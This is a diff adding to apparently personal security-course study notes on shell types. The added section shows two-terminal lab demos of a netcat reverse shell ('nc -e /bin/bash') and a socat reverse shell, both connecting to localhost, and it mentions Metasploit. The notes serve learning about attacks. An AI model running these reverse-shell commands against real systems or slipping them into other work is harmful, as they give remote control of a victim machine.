@@ -25,6 +25,18 @@ Diagramms see pdf
 **Reverse Shell**
 Similar to "bind shell" but here attacker is listening and server initiates connection. This us usually allowed by firewalls.
 
+Simple Netcat Reverse Shell (via 2 open terminals)
+1. Terminal 1 (Attacker): `nc -l -v -p 8080` -> starts listening on port 8080
+2. Terminal 2 (Victim): `cd tmp` `nc.traditional -e /bin/bash localhost 8080` -> connectts to terminal 1 of attacker
+3. Terminal 1 (Attacker): `pwd`-> will show tmp folder from Terminal 2
+
+Simple Socat Reverse Shell (via 2 open terminals)
+1. Terminal 1 (Attacker): `socat file:`tty`,raw,echo=0 TCP-L:8080` -> starts listening on port 8080
+2. Terminal 2 (Victim): `cd tmp` `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:localhost:8080` -> connectts to terminal 1 of attacker
+3. Terminal 1 (Attacker): `pwd`-> will show tmp folder from Terminal 2
+
+*To create a shelf using metasploit see lab task (or also Metasploit.md)*
+
 **Web Shell**
 A web shell is a shell-like interface that enables a web server to be remotely accessed. The user (attacker) can enter commands via browser and commands are sent via http Get (or post) requests.
 
